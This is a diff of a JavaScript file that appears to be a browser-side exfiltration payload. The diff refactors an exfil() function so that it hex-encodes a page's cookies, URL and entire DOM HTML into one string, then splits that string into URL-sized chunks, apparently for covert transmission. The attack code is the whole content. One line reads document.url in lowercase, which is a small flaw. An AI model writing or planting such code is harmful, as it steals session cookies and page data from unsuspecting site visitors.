@@ -66,25 +66,10 @@ function encode(payload){
     return hex_enc;
 }
 
-function export_cookie(){
-  const cookie_val = encode(document.cookie);
-  return cookie_val;
-}
-
-function export_url(){
-  const url_val = encode(document.url);
-  return url_val;
-}
-
-function export_html(){
-  const html_val = encode(document.documentElement.innerHTML);
-  return html_val;
-}
-
 
 
 function exfil() {
-  var payload = export_cookie() + ":" + export_url() + ":" + export_html();
+  var payload = encode("Cookie:\n"+document.cookie+"\nURL: \n"+document.url+"\nDOM HTML:\n"+document.documentElement.innerHTML);
   var chunksize = 200 - document.documentURI.length - 1; // https://www.geeksforgeeks.org/maximum-length-of-a-url-in-different-browsers/
   var numberOfChunks = Math.floor(payload.length / chunksize);
   var remainder = payload.slice(-(payload.length % chunksize));
